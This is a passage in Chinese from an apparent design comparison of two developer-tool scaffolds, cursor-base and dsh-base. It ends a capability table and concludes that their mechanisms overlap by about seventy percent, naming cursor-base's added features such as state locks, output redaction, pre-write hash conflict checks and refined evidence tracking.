| JSON Schema ×6（catalog/matrix/services/receipt/waiver/install-manifest） | cursor 独有形态（zcode 计划 schemas×6 于 Phase 4.1——DEV-PLAN 已含，属已计划） |
| record-lesson/architecture-design/dfx-design/scoped-implementation 等 skills | 与 zcode 17 skills 同族同职责，不列增量 |

---

## 六、结语：cursor-base 相对基线的真实身份

cursor-base 与 dsh-base 是同族脚手架的两个分支（cursor 的 CAPABILITY-MATRIX 自述吸收 cc/codex/grok/pi 四基线），引擎主干（catalog/impact/gate/账本/五性/waiver/risk/retention/manifest）与 dsh 高度同构，**机制面重叠约七成**。其不可替代的增量集中在三类：(1) **并发与留痕卫生**（状态锁、输出脱敏、账本轮转、quarantine）——zcode v2.0 把 hook 与账本做实之前正好需要；(2) **写路径保护**（task known_hashes 写前冲突检测 + baseline 区分预存脏）——宪法「保护现有改动」的执法化，dsh 完全没有；(3) **证据语义细化**（runtime 时间窗、plan hash、FAIL-streak、retention 引用保护、adapters 证据供给侧）。另有三条立场级输入（拒绝全局 fast mode 的反论点、检查优先于常驻文本、Not doing 段）不花实现成本但影响 v2.0 的宪法与 DEV-PLAN 走向。
